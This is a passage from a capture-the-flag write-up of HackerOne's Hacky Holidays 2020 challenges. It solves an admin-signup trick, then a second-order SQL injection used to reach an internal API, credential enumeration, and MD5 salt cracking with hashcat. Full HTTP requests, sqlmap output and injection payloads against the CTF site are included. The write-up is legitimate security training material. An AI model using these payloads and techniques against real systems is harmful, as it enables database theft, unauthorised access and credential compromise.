Here we analyzed how our entries were recorded on `user.txt` and later retrieved:

|variable|length on retrieving|processing on recording
|-|-|-
|username|15|preg_replace() >> substr(15)
|password|32|md5()
|cookie|32|md5()
|age|3|is_numeric() >> strlen<=3 >> intval()
|firstname|15|preg_replace() >> substr(15)
|lastname|15|preg_replace() >> substr(15)
|admin|1
|


Where we have observed that of all the parameters that we can control, the only parameter without explicitly restricted size is `age`.

Checking the official PHP documentation again for: [is-numeric()][13], [intval()][14], And debugging possible values with [phpsh][phpsh]:

```bash
$ phpsh
Starting php
type 'h' or 'help' to see instructions & features

php> echo is_numeric('9e3')
1
php> echo intval('9e3')
9000
php> echo intval('9e9')
9000000000
```

Now we can change the last value in our user record by sending an `age` value with 4 digits or more.

Finally we can register one user using as data:
- action=signup
- username=anynewuser
- password=anypassword
- age=9e3
- firstname=anyfirstname
- lastname=123456789abcdeY

```html
POST /signup-manager/ HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Content-Length: 105
Cache-Control: max-age=0
sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: https://hackyholidays.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://hackyholidays.h1ctf.com/signup-manager/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7

action=signup&username=user1337&password=pizza4admin&age=9e3&firstname=firstname&lastname=123456789abcdeY

HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 21 Dec 2020 18:15:38 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Set-Cookie: token=726c4dfcb427bd544a929d3706f2fc29; expires=Mon, 21-Dec-2020 19:15:38 GMT; Max-Age=3600
Location: /signup-manager/
Content-Length: 0

GET /signup-manager/ HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Cache-Control: max-age=0
sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: https://hackyholidays.h1ctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://hackyholidays.h1ctf.com/signup-manager/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7
Cookie: token=726c4dfcb427bd544a929d3706f2fc29; 

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 21 Dec 2020 18:15:40 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 1116

<!DOCTYPE html>
<html lang="en">
<head>
    <title>SignUp Manager - Admin Area</title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
</head>
<body>
<div class="container" style="margin-top:20px">
    <div class="text-center"><img src="/assets/images/grinch-networks.png" alt="Grinch Networks"></div>
    <h1 class="text-center" style="margin:0;padding:0">Admin Area</h1>
    <div class="row">
        <div class="col-md-6 col-md-offset-3" style="margin-top:15px">
            <div class="alert alert-info">
                <p class="text-center">flag{99309f0f-1752-44a5-af1e-a03e4150757d}</p>
                <p class="text-center">You made it through, continue to your next task <a href="/r3c0n_server_4fdk59">here</a></p>
            </div>
        </div>
    </div>
</div>
</body>
</html>
```

{F1138032}

Yeah!, We got out flag and the endpoint for the next challenge.

> flag: **flag{99309f0f-1752-44a5-af1e-a03e4150757d}**
 next challenge: **/r3c0n_server_4fdk59**

  **To be continued...**

[Hacker0x01]: https://twitter.com/Hacker0x01
[NahamSec]: https://twitter.com/NahamSec
[adamtlangley]: https://twitter.com/adamtlangley
[ahzsec]: https://twitter.com/ahzsec
[MrKn0w1t4ll]: https://twitter.com/MrKn0w1t4ll

[burp]: https://portswigger.net/burp
[hackvector]: https://github.com/hackvertor/hackvertor
[ffuf]: https://github.com/ffuf/ffuf
[hashes.com]: https://hashes.com/en/decrypt/hash
[fcrackzip]: https://github.com/hyc/fcrackzip
[sqlmap]: https://github.com/sqlmapproject/sqlmap
[phpsh]: https://github.com/facebookarchive/phpsh
[cstc]: https://github.com/usdAG/cstc
[hashcat]: https://github.com/hashcat/hashcat

[common.txt]: https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt
[parameters.txt]: https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/burp-parameter-names.txt
[objects.txt]: https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/api/objects.txt
[rockyou.txt]: https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
[names.txt]: https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/Names/names.txt
[10-million-password-list-top-100.txt]: https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100.txt

[1]: https://twitter.com/Hacker0x01/status/1337136927720361984?s=20 "CTF announcement"
[2]: https://hackerone.com/h1-ctf?type=team
[3]: https://www.codebyamir.com/blog/view-source-vs-inspect-element 
[8]: https://www.php.net/manual/es/function.preg-replace.php
[9]: https://www.php.net/manual/es/function.str-replace.php
[12]: https://github.com/sqlmapproject/sqlmap/wiki/Usage
[13]: https://www.php.net/manual/es/function.is-numeric.php
[14]: https://www.php.net/manual/es/function.intval.php

[disclosure]: https://portswigger.net/web-security/information-disclosure/exploiting#files-for-web-crawlers
[idor]: https://portswigger.net/web-security/access-control/idor
[userenum]: https://portswigger.net/web-security/authentication/password-based
[sqli]: https://portswigger.net/web-security/sql-injection
[ssrf]: https://portswigger.net/web-security/ssrf
[dnspin]: https://github.com/0xn3va/cheat-sheets/tree/master/Web%20Application/Server%20Side%20Request%20Forgery
[salt]: https://www.thesslstore.com/blog/difference-encryption-hashing-salting/
- **2020-12-30** @rykkard: # Day 11: Grinch Recon

{F1138026}

We knew our challenge home page from the last challenge already: `/r3c0n_server_4fdk59`, We got the following endpoints after browsing each endpoint available:

- `/r3c0n_server_4fdk59`: home page, shows us albums available and how many photos had each one.
    - `/r3c0n_server_4fdk597/album`: shows all the photos of the selected album according to one GET parameter `hash=<id_album>`.
    - `/r3c0n_server_4fdk597/picture`: returns an image file according to one GET parameter `data=<b64_data>`, whose value is protected with a hash and base64 encoded.
- `/attack-box`: redirect us to a login form, possibly for the last step.

After fuzzing more endpoints on `/r3c0n_server_4fdk59` with [common.txt][common.txt] as wordlist got one new endpoint: `/r3c0n_server_4fdk59/api`

```bash
$ ffuf -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/FUZZ -mc all -fc 404 -t 50 -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
api/experiments         [Status: 401, Size: 64, Words: 9, Lines: 1]
api                     [Status: 200, Size: 2390, Words: 888, Lines: 54]
picture                 [Status: 200, Size: 21, Words: 3, Lines: 1]
uploads                 [Status: 403, Size: 145, Words: 3, Lines: 7]
:: Progress: [4660/4660] :: Job [1/1] :: 131 req/sec :: Duration: [0:00:29] :: Errors: 0 ::
```

Browsing on `/r3c0n_server_4fdk59/api` gave us the API status code descriptions:

{F1138024}

We have tried to fuzz more content here without success, we moved on to the other endpoints then.

We continued to inspect our previous endpoints in detail.

**album 'Xmass 2019' request**
```html
GET /r3c0n_server_4fdk59/album?hash=59grop HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 28 Dec 2020 15:58:28 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 1188

<!DOCTYPE html>
<html lang="en">
<head>
    <title>Grinch Recon</title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
</head>
<body>
<div class="container" style="margin-top:20px">
    <div class="text-center"><img src="/assets/images/grinch-networks.png" alt="Grinch Networks"></div>
    <div class="row">
        <div class="col-md-8 col-md-offset-2">
            <h1 class="text-center">Xmas 2019</h1>
            <div class="row">

                
                    <div class="col-md-4">
                        <img class="img-responsive" src="/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzMyZmViYjE5NTcyYjEyNDM1YTZhMzkwYzA4ZThkM2RhLmpwZyIsImF1dGgiOiI3NmJhMDYxZDM1NmM2MjY0YTYwMDUyMTZlMTc3NmJhNiJ9">
                    </div>

                
            </div>
        </div>
    </div>
</div>
</body>
</html>

```

Testing if it is vulnerable to SQLi, we got the same result of `hash=59grop` with the payload: `hash=59' 'grop`.

Retrieving all database data using [sqlmap][sqlmap] gave us:

```bash
$ sqlmap -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=59grop -p hash --current-db
<..>
sqlmap identified the following injection point(s) with a total of 56 HTTP(s) requests:
---
Parameter: hash (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: hash=59grop' AND 5496=5496 AND 'tVIl'='tVIl

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: hash=-3780' UNION ALL SELECT NULL,NULL,CONCAT(0x716a717671,0x6b774865596659666751554d6b795054466679484155797144796746534a565950696f5979597646,0x71766a7171)-- -
---
'[18:56:09] [INFO] testing MySQL
[18:56:09] [INFO] confirming MySQL
[18:56:11] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 8.0.0
[18:56:15] [INFO] fetching current database
current database: 'recon'
[18:56:16] [WARNING] HTTP error codes detected during run:
404 (Not Found) - 49 times
<..>


# db enumeration
$ sqlmap -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=59grop -p hash --dbs
<..>

current database: 'recon'
current user: 'recon_read@%'

available databases [2]:
[*] information_schema
[*] recon

Database: recon
[2 tables]
+-------+
| album |
| photo |
+-------+
Table: photo
[6 entries]
+----+----------+--------------------------------------+
| id | album_id | photo                                |
+----+----------+--------------------------------------+
| 1  | 1        | 0a382c6177b04386e1a45ceeaa812e4e.jpg |
| 2  | 1        | 1254314b8292b8f790862d63fa5dce8f.jpg |
| 3  | 2        | 32febb19572b12435a6a390c08e8d3da.jpg |
| 4  | 3        | db507bdb186d33a719eb045603020cec.jpg |
| 5  | 3        | 9b881af8b32ff07f6daada95ff70dc3a.jpg |
| 6  | 3        | 13d74554c30e1069714a5a9edda8c94d.jpg |
+----+----------+--------------------------------------+
Table: album
[3 entries]
+----+--------+-----------+
| id | hash   | name      |
+----+--------+-----------+
| 1  | 3dir42 | Xmas 2018 |
| 2  | 59grop | Xmas 2019 |
| 3  | jdh34k | Xmas 2020 |
+----+--------+-----------+
```

We got a lot of data, but nothing directly useful.

Going back to the answer on `/r3c0n_server_4fdk59/album?hash=59grop`, let's inspect our base64 encoded value.

```bash
$ echo eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzMyZmViYjE5NTcyYjEyNDM1YTZhMzkwYzA4ZThkM2RhLmpwZyIsImF1dGgiOiI3NmJhMDYxZDM1NmM2MjY0YTYwMDUyMTZlMTc3NmJhNiJ9 | base64 -d
{"image":"r3c0n_server_4fdk59\/uploads\/32febb19572b12435a6a390c08e8d3da.jpg","auth":"76ba061d356c6264a6005216e1776ba6"} 
```

We knew that we need a valid authorization hash `auth` if we want the server to accept a changed value in `image`.

After going out to clear my mind for a while, I remembered a similar challenge in the H101 CTF, a situation where the server did an SQL query with the result of a previous SQL query.

Manually trying multiple attack vectors using [Hackvector][hackvector], We got the same image with the following payload: `hash=<@burp_urlencode_0>alfa' union select "0'union select 0,0,<@sql_hex_1>../uploads/32febb19572b12435a6a390c08e8d3da.jpg<@/sql_hex_1>#","bravo","album title"#<@/burp_urlencode_0>`

```html
# Xmass 2019 picture 
GET /r3c0n_server_4fdk59/album?hash=<@burp_urlencode_0>alfa' union select "0'union select 0,0,<@sql_hex_1>../uploads/32febb19572b12435a6a390c08e8d3da.jpg<@/sql_hex_1>#","bravo","album title"#<@/burp_urlencode_0> HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7

[..]
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Grinch Recon</title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
</head>
<body>
<div class="container" style="margin-top:20px">
    <div class="text-center"><img src="/assets/images/grinch-networks.png" alt="Grinch Networks"></div>
    <div class="row">
        <div class="col-md-8 col-md-offset-2">
            <h1 class="text-center">Xmas 2019</h1>
            <div class="row">

                
                    <div class="col-md-4">
                        <img class="img-responsive" src="/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzMyZmViYjE5NTcyYjEyNDM1YTZhMzkwYzA4ZThkM2RhLmpwZyIsImF1dGgiOiI3NmJhMDYxZDM1NmM2MjY0YTYwMDUyMTZlMTc3NmJhNiJ9">
                    </div>

                
            </div>
        </div>
    </div>
</div>
</body>
</html>
```
At this point, for each request sent I had to retrieve the data value from there and use the endpoint `/r3c0n_server_4fdk59/picture?data=` to see the result each time, since it was necessary to fuzz many values, I started to check what alternatives I had with [Burp Suite][burp] before writing a script from scratch.

Checking out alternatives I finally got what I needed using the following recipe for Incoming Responses on [CSTC][cstc] Burp extension:

**cstc_hacky_holidays_day11.json**
```json
[[{"operation":"de.usd.cstchef.operations.conditional.StringContains","parameters":{"Case Sensitive":false,"Skip Lanes":"4","Expr":"src=\"/r3c0n_server_4fdk59/picture?data=","Skip Operations":"0","Invert Match":true}}],[{"operation":"de.usd.cstchef.operations.extractors.HttpBodyExtractor","parameters":{}},{"operation":"de.usd.cstchef.operations.extractors.RegexExtractor","parameters":{"Regex":"data=([^\"]*)\">","Output format":"List capture groups"}},{"operation":"de.usd.cstchef.operations.dataformat.UrlEncode","parameters":{"checkbox1":false}},{"operation":"de.usd.cstchef.operations.utils.StoreVariable","parameters":{"Variable name":"data"}}],[{"operation":"de.usd.cstchef.operations.string.Replace","parameters":{"Expr":"^HTTP/1.1 200 OK","checkbox1":true,"Value":"GET /r3c0n_server_4fdk59/picture?data=$data HTTP/1.1"}},{"operation":"de.usd.cstchef.operations.setter.HttpHeaderSetter","parameters":{"checkbox1":true,"Value":"hackyholidays.h1ctf.com","Key":"Host"}},{"operation":"de.usd.cstchef.operations.setter.HttpHeaderSetter","parameters":{"checkbox1":true,"Value":"0","Key":"Content-Length"}},{"operation":"de.usd.cstchef.operations.networking.HTTPRequest","parameters":{"Port":"443","Host":"hackyholidays.h1ctf.com","SSL":true}}],[],[],[],[],[],[],[]]
```

{F1138023}

Now we can make use of Intruder in [Burp Suite][burp] to fuzz new endpoints like `../api/FUZZ` using as wordlist [objects.txt][objects.txt]:

```html
GET /r3c0n_server_4fdk59/album?hash=<@burp_urlencode_0>alfa' union select "0'union select 0,0,<@sql_hex_1>../api/§§<@/sql_hex_1>#","bravo","album title"#<@/burp_urlencode_0> HTTP/1.1
Host: hackyholidays.h1ctf.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7


```

{F1138021}

Inspecting both new endpoints we got as a response in both: `Invalid content type detected`. 

In the same way we fuzzed GET parameters using as wordlist [burp-parameter-names.txt][parameters.txt] then.

Fuzzing GET parameters:
 - in `../api/ping` leads to nothing.
 - in `../api/user` we got: `username` and `password`.

 I must confess that I was blocked for days in this part, having `username` and `password` as parameters led me to think that it was a badly implemented login, and enumeration of users as if it were a login didn't work.

 Sharing ideas with other CTF participants, led me to reevaluate that the parameters could also be used to query users either by name or by password.

One request with `../api/user?username=admin` returned to us `Expected HTTP status 200, Received: 204`
 ```html
 GET /r3c0n_server_4fdk59/album?hash=<@burp_urlencode_0>alfa' union select "0'union select 0,0,<@sql_hex_1>../api/user?username=admin<@/sql_hex_1>#","bravo","album title"#<@/burp_urlencode_0> HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Cache-Control: max-age=0
sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 28 Dec 2020 22:14:12 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 39

Expected HTTP status 200, Received: 204
 ```

 And using as username `%` got a different response, being very possible that the server were doing SQL queries in the database using LIKE.

```html
GET /r3c0n_server_4fdk59/album?hash=<@burp_urlencode_0>alfa' union select "0'union select 0,0,<@sql_hex_1>../api/user?username=%<@/sql_hex_1>#","bravo","album title"#<@/burp_urlencode_0> HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Cache-Control: max-age=0
sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 28 Dec 2020 22:19:44 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 29

Invalid content type detected
```

With all this, we can enumerate usernames and passwords character by character using Intruder in [Burp Suite][burp] with [names.txt][names.txt] and [10-million-password-list-top-100.txt][10-million-password-list-top-100.txt] as wordlists.

```html
GET /r3c0n_server_4fdk59/album?hash=<@burp_urlencode_0>alfa' union select "0'union select 0,0,<@sql_hex_1>../api/user?username=§admin§%<@/sql_hex_1>#","bravo","album title"#<@/burp_urlencode_0> HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Cache-Control: max-age=0
sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7


```

{F1138025}

Doing the same process for passwords, we got as credentials:

> username: **grinchadmin**
> password: **s4nt4sucks**

Finally, we managed to login on `/attack-box/login` with credentials `grinchadmin:s4nt4sucks`, grab our flag and found the last challenge.

```html
POST /attack-box/login HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Content-Length: 40
Cache-Control: max-age=0
sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: https://hackyholidays.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://hackyholidays.h1ctf.com/attack-box/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7

username=grinchadmin&password=s4nt4sucks

[..]
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Attack Console</title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
</head>
<body>
<div class="container">
    <div class="col-md-6 col-md-offset-3">

        <div class="text-center"><img src="/assets/images/grinch-networks.png" alt="Grinch Networks"></div>
        <h1 class="text-center">Grinch Network Attack Server</h1>
        <h4 class="text-center">flag{07a03135-9778-4dee-a83c-7ec330728e72}</h4>
        <div class="alert alert-info text-center">
            <p>We've identified Santa's key servers and loaded them into the attack server ready for you to take down</p>
        </div>
        <..>
</div>
</body>
</html>
```
> flag: **flag{07a03135-9778-4dee-a83c-7ec330728e72}**
> next challenge: **/attack-box**

# Day 12: Attack Console

{F1138022}

We are in the last challenge now, after browsing all pages  which we have access to:

- `/attack-box`: main page, allows launching the DDoS attack on Santa's servers.
    - `/launch?payload=<b64_value>`: allows launching one DDoS attacks on any target: domain/IP, but requires a valid hash for the target. 
    - `/attack-box/launch/<attack_id>`: makes use of `/attack-box/launch/<attack_id>.json` to show an update on the attack status.
    - `/attack-box/launch/<attack_id>.json` 

Moving on to analyze the attack on Santa's server: `203.0.113.33`

```html
GET /attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ== HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://hackyholidays.h1ctf.com/attack-box
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7
Cookie: attackbox=d09d508e78f3975e0199a5e91dde9687

HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 28 Dec 2020 23:55:53 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Location: /attack-box/launch/3172bbbb57e37b40fe36c44df6722142
Content-Length: 0
```

After base64 decoding the payload value we got:

```bash
# target: 203.0.113.33
$ echo eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==| base64 -d
{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}

echo eyJ0YXJnZXQiOiIyMDMuMC4xMTMuNTMiLCJoYXNoIjoiMjgxNGY5YzczMTFhODJmMWI4MjI1ODUwMzlmNjI2MDcifQ==| base64 -d
{"target":"203.0.113.53","hash":"2814f9c7311a82f1b822585039f62607"}

echo eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMjEzIiwiaGFzaCI6IjVhYTliNWE0OTdlMzkxOGMwZTE5MDBiMmEyMjI4YzM4In0=| base64 -d
{"target":"203.0.113.213","hash":"5aa9b5a497e3918c0e1900b2a2228c38"}

```

Trying to change only the target's IP to `127.0.0.1` we're blocked, because it requires one valid protection hash.

At this point, we know valid protection hashes for Santa's servers so I tested:

- direct hashing like: MD2, MD4 or MD5.
- weak secret with already known plaintext and protection hash: reverse HMAC-MD5.


It wasn't until Hackerone released a clue on twitter that I realized I forgot hashing with [salt][salt].

{F1138027}

Using [hashcat][hashcat] with [rockyou.txt][rockyou.txt] as wordlist was easy to retrieve the salt value: `mrgrinch463`

```bash
$ cat hashes.txt
5f2940d65ca4140cc18d0878bc398955:203.0.113.33

# https://hashcat.net/wiki/doku.php?id=example_hashes
# 0     MD5                     8743b52063cd84097a65d1633f5c74f5
# 50	HMAC-MD5 (key = $pass)	fc741db0a2968c39d9c2a5cc75b05370:1234
# 60	HMAC-MD5 (key = $salt)	bfd280436f45fa38eaacac3b00518f29:1234
# 10	md5($pass.$salt)    	01dfae6e5d4d90d9892622325959afbe:7050461
# 20	md5($salt.$pass)    	f0fda58630310a6dd91a7d8f0a4ceda2:4225637426
$ hashcat -a 0 -m 10 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...
<..>
5f2940d65ca4140cc18d0878bc398955:203.0.113.33:mrgrinch463

Session..........: hashcat
Status...........: Cracked
Hash.Name........: md5($pass.$salt)
Hash.Target......: 5f2940d65ca4140cc18d0878bc398955:203.0.113.33
<..>
```

